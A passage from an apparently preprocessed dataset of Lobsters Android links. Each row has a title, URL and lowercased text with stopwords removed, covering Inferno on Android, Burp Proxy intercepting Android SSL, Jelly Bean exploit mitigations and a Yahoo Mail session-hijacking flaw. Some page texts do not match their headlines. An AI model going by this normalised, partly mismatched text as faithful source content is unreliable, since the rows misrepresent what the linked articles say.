mkconfig make syshostobjtype change android curl http wwwbluishcoderconzinfernoinfernopatch patch vim change line described mk nuke mk install inferno device built use device test run rooted android phone well install run parallelpushsh script device connected copy everything datainferno phone parallelpushsh booting phone still boot main o android inferno manually run using adb adb shell stop stop zygote android cd datainfernoandroidarmbin emug wmwm running emug shell run inferno command device interface access phone function documented readmeandroid example turn phone enable gsm data new zealand vodafone network echo phonectl echo net gsm wwwvodafonenetnz phonectl photo main phone screen tetri running phone switch inferno back main o kill running emug process start zygote kill process id emug start start zygote android bunch issue existing port unfortunately hardware capacitive key nt work work around tweaking etcbuttonservercfg use volume key bring keyboard least type touch screen seems pixel sound nt work due disabling patch applied get thing compiling test receiving making call though using direct device access worked inferno interesting operating system distributed feature limbo programming language might different approach could taken integrate phone desktop device share computing resource existing port bitrot step build seen quite manual streamlined dual booting android inferno nt difficult nice see continued work inferno android experiment distributed application mobile device
597,Lobsters,android,Android,Inside Android 4.2's powerful new security system,http://blogs.computerworld.com/android/21259/android-42-security,inside android powerful new security system,google sheet v microsoft excel work better business,google sheet v microsoft excel work better business
599,Lobsters,android,Android,"RAZR i, believe: does Intel's first real smartphone measure up?",http://www.theverge.com/2012/10/4/3447984/motorola-razr-i-review-intel-smartphone,razr believe intel first real smartphone measure,updated take advantage processor number motorola razr razr processor graphic ram internal storage connectivity camera o battery capacity quadrant score glbenchmark egypt score sunspider score verge battery test,looking define best smartphone natural instinct processor nerd head directly synthetic benchmark application course foolish dictate phone value purely number difference two model benchmark great tool highlight pro con quadrant glbenchmark de facto standard android benchmark offering battery test tax processor graphic capability storage ram mean perfect metric however final score quadrant affected screen resolution whatever code already running device different processor architecture could also make inaccurate comparison razr scored significantly higher test performance gap nt noticeable everyday use pair handled game tested ease benchmark show gap performance nt apparent everyday useour final benchmark test sunspider browserbased test race execute predetermined set javascript code interest fairness ran test chrome android rather using razr preinstalled browser application although razr battle huge margin intel always good browser chrome updated take advantage processor result nt surprising also checked battery life phone another area strength intel standard battery test cycle website video screen set percent brightness razr lasted seven hour minute razr lasted full eight hour minute phone truly differ however standby time razr managed last hour regular use including pushing email two separate account percent battery remaining contrast razr get full day normal usage much strong battery life compared many android device test experience clear intel chip far frugal power dualcore snapdragon number motorola razr razr processorrazr arm dualcore snapdragon razr singlecore saltwell graphicsrazr adreno powervr sgx internal microsdhc slot connectivityrazr lte hspda hspda still video osandroid upgrade android promised battery quadrant scorerazr glbenchmark egypt scorerazr sunspider scorerazr verge battery testrazr
601,Lobsters,android,Android,New From Parse - Cloud Code,http://blog.parse.com/2012/09/11/welcoming-cloud-code-to-the-parse-family/,new parse cloud code,graphql available available security issue,glad announce parse server support graphql graphql opensource data query manipulation language help developer build fast stable apps us type ensure apps ask possible provide clear helpful error parse server easiest way instantly create graphql api amongst core team recently discussed adopting governance model make parse community transparent make decision making process clear make easier contribute project tom fox march parse platform changed lot past month departure one core contributor arrival new contributor also look back success last year work coming month florent vilmart august summer really busy dusted j sdk stripping large part legacy parsepromises backbone style callback definitely ben friedman january like take moment say thank everyone community beyond great year providing parse without everyone help ben friedman december version parse php sdk available use jump includes quite new feature among relative time query aggregate query index management ben friedman october hacktoberfest underway encourage take time sign hacktoberfest start contributing parseserver open source project github find detail signup oh mention free tshirts ben friedman september version parse php sdk available use jump includes support hhvm full text query support ben friedman july security issue recently disclosed nodejs affect version node starting line way stand security update released week ago currently available active release line including highly recommend update implementation patch issue assuming already
602,Lobsters,android,Android,BitTorrent Inc. released µTorrent Beta for Android,https://play.google.com/store/apps/details?id=com.utorrent.client,bittorrent inc released µtorrent beta android,,utorrent android torrent downloader google play store million downloads µtorrent downloads file high speed using bittorrent hyper distribution communication protocol peertopeer file sharing splitting downloadable file multiple part employing multi threading seeding help download music movie video file many time fasterµtorrent official bittorrent android torrent downloader enjoy awesome torrent downloading experience speed size limit downloadingfast light powerful core torrent download technology developed utorrent downloader around mobile download needstop beautifully light clean simply download file directly share file torrent ease download speed limit torrent download size better music listening video viewing experience integrated music video translation pусский español italiano português download free music movie video licensed content partner bittorrent new user look magnet link click searching torrent downloaded one music file torrent play select file download within torrent minimize storage get best performance avoid running data charge mobile movie music download recommend taking advantage torrenting seeding wifionly mode whenever possibleadvanced wifi mode save mobile choose file download download torrent download magnet choose deleting torrent torrent filesfaqs visit page http helputorrentcomhelp support visit utorrent forum http u facebook http wwwfacebookcombittorrentfollow u twitter http twittercombittorrentfeedbackyour feedback important u please email u directly utandroid bittorrentcom problem request brought µtorrent mobile team light limitless androidby downloading using bittorrent utorrent torrent downloader client agree term use http wwwbittorrentcomlegaltermsofuse privacy policy http wwwbittorrentcomlegalprivacy
603,Lobsters,android,Android,Chinese clone maker wants to sue Apple over iPhone 5 design,http://www.neowin.net/news/chinese-clone-maker-wants-to-sue-apple-over-iphone-5-design,chinese clone maker want sue apple iphone design,shameless androidbased ripoff gizmodo gizchina,goophone chinese company behind android phone designed resemble leaked iphone part planning sue apple finalized device actually end looking like phone goophone released shameless androidbased ripoff leaked iphone prototype goophone chinese market last week mind mean went market design apple iphone actually end looking like leak seen far apple copying talk twisted logic china interesting see suit actually go anywhere even come depends whether iphone whatever apple decides call actually resembles leak seen far whether goophone willing go crazy plan whatever happens going hilarious watch copyright battle get crazier via gizmodo source gizchina image via goophone
604,Lobsters,android,Android,Sony release binaries to support JBQ’s Vanilla Android Xperia S project,http://developer.sonymobile.com/2012/09/03/sony-release-binaries-to-support-jbqs-vanilla-android-xperia-s-project-download/,sony release binary support jbq vanilla android xperia project,program develop,program developer program support see program please go develop top menu
606,Lobsters,android,Android,New Burp Proxy cracks Android SSL,http://www.h-online.com/security/news/item/New-Burp-Proxy-cracks-Android-SSL-1663112.html,new burp proxy crack android ssl,burp proxy connect new version portswigger djwm,new version burp proxy designed improve analysis encrypted ssl connection android phone developer security researcher like use burp proxy examine web traffic pc lately also smartphones example h associate heise security recently used burp analyse activity various smartphone apps ct magazine analyse web traffic burp server entered proxy http http connection device selfsigned ca certificate installed ca certificate allows burp proxy generate onthefly certificate order imitate http server act maninthemiddle encrypted data traffic analysed posing maninthemiddle however problem android phone device initially retrieved target server address via dns used proxy access directly using connect burp nt know server name generate certificate used server ip address common name causing error message even aborted connection smartphone new version initially establishes ssl connection target server best imitate server certificate burp proxy part portswigger burp suite djwm
614,Lobsters,android,Android,Android Security Overview,http://source.android.com/tech/security/,android security overview,android designed open security update resource android designed developer nogotofail developerandroidcom android designed user partner public nexus help center pixel help center background figure device hardware android operating system android application runtime preinstalled apps userinstalled apps google security service google mobile service year review google play license verification android update app service backing verify apps harmful apps safetynet safetynet attestation attestation android device manager web app android app security program overview design review penetration testing code review open source community review incident response security bug monthly security update monthly update platform security architecture,android incorporates industryleading security feature work developer device implementers keep android platform ecosystem safe robust security model essential enable vigorous ecosystem apps device built around android platform supported cloud service result entire development lifecycle android subject rigorous security program android designed open android apps use advanced hardware software well local served data exposed platform bring innovation value consumer realize value platform offer app environment protects confidentiality integrity availability user data apps device network securing open platform requires strong security architecture rigorous security program android designed multilayered security flexible enough support open platform still protecting user platform information reporting security issue update process see security update resource android designed developer security control designed reduce burden developer securitysavvy developer easily work rely flexible security control developer le familiar security protected safe default addition providing stable platform build upon android give additional support developer number way android security team look potential vulnerability apps suggests way fix issue device google play play service delivers security update critical software library openssl used secure app communication android security released tool testing ssl nogotofail help developer find potential security issue whichever platform developing information android app developer found developerandroidcom android designed user user provided visibility permission requested app control permission design includes expectation attacker would attempt perform common attack social engineering attack convince device user install malware attack thirdparty apps android android designed reduce probability attack greatly limit impact attack event successful android security continues progress device user hand android work partner public provide patch android device continuing receive security update information end user found nexus help center pixel help center device manufacturer help center page outline goal android security program describes fundamental android security architecture answer pertinent question system architect security analyst focus security feature android core platform nt discus security issue unique specific apps related browser sm app background android provides open source platform app environment mobile device section page describe security feature android platform figure illustrates security component consideration various level android software stack component assumes component properly secured exception small amount android o code running root code linux kernel restricted application sandbox figure android software stack main android platform building block device hardware android run wide range hardware configuration including mobile phone tablet watch automobile smart tv ott gaming box settopboxes android processoragnostic take advantage hardwarespecific security capability arm executenever android operating system core operating system built top linux kernel device resource like camera function gps data bluetooth function telephony function network connection accessed operating system android application runtime android apps often written java programming language run android runtime art however many apps including core android service apps native apps include native library art native apps run within security environment contained within application sandbox apps get dedicated part file system write private data including database raw file android apps extend core android operating system two primary source apps preinstalled apps android includes set preinstalled apps including phone email calendar web browser contact function user apps provide key device capability accessed apps preinstalled apps may part open source android platform may developed device manufacturer specific device userinstalled apps android provides open development environment support thirdparty app google play offer user hundred thousand apps google security service google provides set cloudbased service available compatible android device google mobile service service nt part android open source project aosp included many android device information service see android security year review primary google security service google play google play collection service allow user discover install purchase apps android device web google play make easy developer reach android user potential customer google play also provides community review app license verification app security scanning security service android update android update service delivers new capability security update selected android device including update web air ota app service framework allow android apps use cloud capability backing app data setting cloudtodevice messaging push messaging verify apps warn automatically block installation harmful apps continually scan apps device warning removing harmful apps safetynet privacy preserving intrusion detection system assist google tracking mitigate known security threat identify new security threat safetynet attestation thirdparty api determine whether device ct compatible attestation also identify android app communicating app server android device manager web app android app locate lost stolen device security program overview key component android security program include design review android security process begin early development lifecycle creation rich configurable security model design major feature platform reviewed engineering security resource appropriate security control integrated architecture system penetration testing code review development platform androidcreated open source component subject vigorous security review review performed android security team google information security engineering team independent security consultant goal review identify weakness possible vulnerability well major release simulate type analysis performed external security expert upon release open source community review aosp enables broad security review interested party android also us open source technology undergone significant external security review linux kernel google play provides forum user company provide information specific apps directly user incident response even precaution security issue may occur shipping android project created comprehensive security response process fulltime android security team member monitor androidspecific general security community discussion potential vulnerability review security bug filed android bug database upon discovery legitimate issue android team response process enables rapid mitigation vulnerability ensure potential risk android user minimized cloudsupported response include updating android platform aosp update removing apps google play removing apps device field monthly security update android security team provides monthly update google android device device manufacturing partner platform security architecture android seek secure usable operating system mobile platform repurposing traditional operating system security control protect app user data protect system resource including network provide app isolation system apps user achieve objective android provides key security feature robust security o level linux kernel mandatory app sandbox apps secure interprocess communication app signing appdefined usergranted permission
615,Lobsters,android,Android,Exploit Mitigations in Android Jelly Bean 4.1,https://blog.duosecurity.com/2012/07/exploit-mitigations-in-android-jelly-bean-4-1/,exploit mitigation android jelly bean,duo lab exploit mitigation android jelly bean new aslr support android ic recent release brief history mitigation android official security documentation android android android android new jelly bean aslr position independent executables pie previous post android aslr linker arm aslr heap brk randomization aslr linker randomization randomized elf hardening relro bindnow linker arm gingerbreak exploit nt root robot presentation blog post infoleak prevention dmesgrestrict kptrrestrict dmesgrestrict kptrrestrict dan rosenberg levitator exploit next android aslr weakness bit entropy fortifysource fortifysource pax hardening mac rbac new seccomp filter mandatory code signing bouncer challenge,duo lab exploit mitigation android jelly bean month since analysis new aslr support android ic given ic old news recent release jelly bean thought time give update aslr capability well cover improvement exploit mitigation present jelly bean quick recap current state aslr android ic uninitiated aslr randomizes various area memory eg stack heap libs etc mapped address space process combined complementary mitigation technique nonexecutable memory protection nx xn dep wx whatever want call aslr make exploitation traditional memory corruption vulnerability probabilistically difficult unfortunately aslr support android live expectation largely ineffective mitigating realworld attack due lack randomization executable linker memory region also would beneficial randomize heapbrk setting thing nt great shape despite deficiency android stepped game mitigationwise new jelly bean release read full detail brief history mitigation android going give overview exploit mitigation evolved year various version android look like nick k google beat great timeline official security documentation android propolice prevent stack buffer overrun fstackprotector safeiop reduce integer overflow extension openbsd dlmalloc prevent double free vulnerability prevent chunk consolidation attack chunk consolidation attack common way exploit heap corruption openbsd calloc prevent integer overflow memory allocation android format string vulnerability protection wformatsecurity werrorformatsecurity hardwarebased execute nx prevent code execution stack heap linux mmapminaddr mitigate null pointer dereference privilege escalation enhanced android android address space layout randomization aslr randomize key location memory android pie position independent executable support readonly relocation immediate binding wl z relro wl z dmesgrestrict enabled avoid leaking kernel address kptrrestrict enabled avoid leaking kernel address new jelly bean exploit mitigation addedimproved jelly bean let go bit detail aslr position independent executables pie mentioned previous post android aslr executable mapping process address space randomized ice cream sandwich making ropstyle attack possible using whole executable source gadget jelly bean binary compiledlinked pie flag commits linker arm mean executable mapping properly randomized executed check whether binary pie use readelf check type field elf header example vold binary ice cream sandwich pieenabled indicated exec elf type armlinuxandroideabireadelf h grep type type exec executable file vold binary new jelly bean version pieenabled indicated dyn elf type armlinuxandroideabireadelf h grep type type dyn shared object file aslr heap brk randomization mentioned previous blog post kernelrandomizevaspace sysctl set jelly bean enabling randomization heapbrk space lacking ice cream sandwich verify correct randomizevaspace parameter easily device using adb shell android cat procversion linux version shell android cat procsyskernelrandomizevaspace aslr linker randomization custom android linker last piece aslr puzzle randomized ice cream sandwich jelly bean linker randomized process address space mean deficiency ic pointed previous blog post addressed jelly bean giving full stack heapbrk libmmap linker executable aslr prop nick k android team getting implemented landed elf hardening relro bindnow also new jelly bean system binary compiled relro bindnow flag passed linker commits linker arm hardens binary attack may attempt overwrite got sensitive elf structure making readonly startup stealth popular gingerbreak exploit used got overwrite obtain code execution vold daemon check slide nt root robot presentation see gingerbreak overwrites got entry point system executes arbitrary privileged command interested nonandroidspecific detail relro bindnow linker flag prevent got overwrites elf trickery julien good blog post topic infoleak prevention dmesgrestrict kptrrestrict jelly bean also pulled couple easy enhancement inherited upstream linux kernel prevent information leakage dmesgrestrict kptrrestrict sysctls originally implemented dan rosenberg available enabled former prevent unprivileged user reading dmesgklogctl buffer may contain sensitive information latter prevent system exposing sensitive kernel address eg various interface proc unprivileged userspace process end result denying attacker information source system may aid increasing feasibility reliability kernel exploit example levitator exploit used prockallsyms interface restricted kptrrestrict huge gain still good proactive step next android aslr weakness aslr implemented fully certainly drive interest towards inherent weakness aslr platformarchitecturespecific aslr bypass expect see analysis showing weak full aslr entropywise dealing constraint address space start digging implementationspecific detail exploit mitigation hilarity often result case point bit entropy window stack cooky hey maybe find free time fortifysource since google decided implement libc bionic lose exploit mitigation benefit glibc really use exploit mitigation benefit glibc sentence one example fortifysource group mitigation prevent certain style buffer overflow string formatting attack google implement similar functionality bionic library pax hardening pax grsecurity patchsets offer wide range hardening technique go beyond traditional linux userspace kernel offer technique may inappropriate mobile use due performance impact architectural consideration google definitely cherrypick patchsets decide proactive exploit mitigation mac rbac system hardened latest greatest exploit mitigation available one usually look towards method containing successful exploit prevent adversely affecting rest system commonly linux world folk deploy mac rbac based system selinux grsecurity smack yama seccomp etc attempt sandbox bound impact successful exploit given google involvement new seccomp filter chromeos chromium would surprised see employed android near future mandatory code signing lastly code signing would go long way towards preventing traditional memory corruption attack also making bouncer challenge bit tractable android still playing bit catchup mobile platform moving ahead innovative exploit mitigation technique inkernel aslr present apple io one could claim io proactive technique reality simply reactive type exploit typically target io platform however apple deserve credit raising barrier point kernel exploitation employing effective userspace mitigation nx aslr mandatory code signing thankfully android getting jelly bean major step towards goal caption id align aligncenter width dug jon spend time testing android security inperson caption
617,Lobsters,android,Android,Android spam bots? What we know for sure,http://nakedsecurity.sophos.com/2012/07/06/android-spam-bots-what-we-know-for-sure/,android spam bot know sure,,sophos home protects every mac pc home
618,Lobsters,android,Android,Google I/O 12 - The Android Sessions - YouTube,https://www.youtube.com/playlist?list=PL4C6BCDE45E05F49E,google io android session youtube,,
619,Lobsters,android,Android,Android 4.1 source code released,https://groups.google.com/forum/#!msg/android-building/XBYeD-bhk1o/ry-0jTGimEQJ,android source code released,,use google group discussion please enable javascript browser setting refresh page
620,Lobsters,android,Android,"Android Botnet? No, a Much Simpler Flaw in Yahoo! Mail's App",http://securitywatch.pcmag.com/none/300005-android-botnet-no-a-much-simpler-flaw-in-yahoo-mail-s-app,android botnet much simpler flaw yahoo mail app,android botnet much simpler flaw yahoo mail app android botnet blog post securityyahoocom android notnet android botnet,android botnet much simpler flaw yahoo mail app lookout discovered yahoo mail android app center potential android botnet investigationdoes nt encrypt data transit warning hacker could hijack user account lookout discovered yahoo mail android center potential android botnet nt encrypt user data transit issued warning hacker could easily hijack user account although enable encryption app setting default app nt secure data transmission unaware user could find entire account hijacked connected insecure wifi network vein attack given security oversight believe plausible explanation sm spam botnet reported recently involves session hijacking lookout cto kevin mahaffey wrote updated blog post reported yesterday microsoft sophos initially believed spam attack coming yahoo mail server related android first botnet fix pretty simple user enable ssl within app going option general setting select enable ssl however little surprising yahoo nt enable encrypted communication default meanwhile yahoo sent u following statement investigation claim potential malware compromise operating botnet ongoing confirm problem official yahoo mail app android reason user uninstall app one largest web mail service world value user privacy safety taken effort across mobile offering including yahoo mail app android use information authorized manner according privacy policy encourage user install mobile apps authorized marketplace also change password periodic basis yahoo mail also encourages consumer educate online safety tip securityyahoocom mobile forensics firm viaforensics folk discover famous maninthemiddle flaw paypal ran app security audit confirmed lookout finding successfully hijacked account using yahoo mail app android traffic encrypted ssl option default grabbed cookie ad network used login successful without ever getting person username password full access account said andrew hoog cio viaforensics viaforensics flunked yahoo mail app securely storing user name email android notnetmeanwhile researcher still scratching head source viagratouting spam appeared come hijacked android device clear evidence android botnet thinning day
